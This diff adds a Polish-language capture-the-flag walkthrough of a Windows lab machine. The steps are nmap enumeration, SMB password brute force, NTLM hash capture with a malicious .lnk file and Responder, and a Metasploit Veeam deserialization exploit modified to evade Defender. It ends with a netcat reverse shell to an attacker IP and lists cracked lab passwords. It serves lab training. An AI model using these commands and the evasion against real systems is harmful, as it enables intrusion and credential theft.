@@ -1,0 +1,71 @@
+MNMAP:
+ nmap -sC -sV 10.10.35.251
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2022-10-29 01:59 BST
+Nmap scan report for windcorp.thm (10.10.35.251)
+Host is up (0.00051s latency).
+Not shown: 997 filtered ports
+PORT    STATE SERVICE       VERSION
+135/tcp open  msrpc         Microsoft Windows RPC
+443/tcp open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+| ssl-cert: Subject: commonName=set.windcorp.thm
+| Subject Alternative Name: DNS:set.windcorp.thm, DNS:seth.windcorp.thm
+| Not valid before: 2020-06-07T15:00:22
+|_Not valid after:  2036-10-07T15:10:21
+|_ssl-date: 2022-10-29T01:00:12+00:00; 0s from scanner time.
+445/tcp open  microsoft-ds?
+MAC Address: 02:B7:CA:07:7A:13 (Unknown)
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2022-10-29 02:00:15
+|_  start_date: 1600-12-31 23:58:45
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 75.35 seconds
+
+
+Na stronie Znajdujemy funkcje Search można wyszukac użytkowników. Znajdujemy  odniniesienie do bazy danych użytkownikow. assets/data/users.xml
+Edytujemy plik do samych nazw poczty, potem brutforse SMB  rockyou.txt   nie daje rezultatow. Próbujemy hasla z próbujemy z /usr/share/wordlists/dirb/others/best15.txt
+
+<name>Ricky Reed</name>
+<phone>9759905687</phone>
+<email>rickyree@windcorp.thm</email>       EDYTUJEMY wszystko w wim                by dostac <email>                grep '<email>' plik   > nowy plik
+
+Edytujemy w VIM     <email>zacksul@windcorp.thm</email    By pozbyc sie  <email>    z przodu wpisujemy  :%/s<email>//g     By pozbyc sie  z tyłu wpisujemy   :%/s<\/email>//g  oraz @windcorp.thm
+
+INSTALUJEMY crackmapexec i brutforsujemy.  SMB  Hasło "Passw@rd"   LOGIN "myrtleowe"
+
+
+Po zalogowaniu sie do SMB mamy Info.txt w srodku flaga i napis :"Zip and save your project files here. We will review them"
+
+Należy podeslac plik w w zip i przechwycic hash responderem. 
+
+Plik generujemy  mslink.sh -l open -n share -i \\\\ip\\share -o share.lnk , potem zamieniamy na zip  zip share.zip share.lnk
+
+Alternatywa  lnkup    --host ip --output     nazwapliku.lnk --type ntlm 
+
+Odsylamy na SMB włączamy nałsuchwianie    responder -i tun0 ,po chwili dostajemy  hasha od użytkownika MichelleWat.  HASHCAT albo JOHN    haslo = "!!!MICKEYmouse". Logujemy się do Windowsa.
+
+Eskalacja upragnien:
+winpeas , whoami /all itp...
+Sprawdzamy procesy  PS .Widzimy podejżane działanie Veeam.One.Agent.Servic 
+
+Sprawdzamy netstat -ao    widzmy podejzane dzialanie na porcie 2085    Sprawdzamy  proces : get-process -id 
+
+Sprawdzamy informacje o programie : get-item  'C:\Program files\veeam\veeam one\ veeam one agent \ veeam.one.service.exe' | format-list*      : vesria 9.5.4.4566
+
+Tunelowanie ssh :echo y|& ./plink.exe -ssh -N -l user -pw haslo -R mojeip:2805:127.0.0.1:2805 mojeip
+
+Użylem veeam_one _agent_desertialization z metasploita. Trzeba było edytować cały kod ponieważ byl blokowany przez defendera. Należy dodać dodatkowe pole do ustawienia cmd payload exec .
+
+Udało się stworzyc na dysku C  Temp  gdzie wgralem nc.exe którego uzyjemy w ustawieniu metasploita. Próbowałem rownież przez server smb lecz coś nie działało. 
+
+Rhosts należy ustawić  Localhost  który ztunelowalismy  na 2805 . Payload windows/x64/exec.  CMD należało użyć  "" bez tego nie działa "C:\Temp\nc.exe -e cmd 10.10.52.162 4444"  
+Nasłuchiwanie nc -lvnp 4444   run  ...... i mamy shell Admina! GG                     Gra skończona!
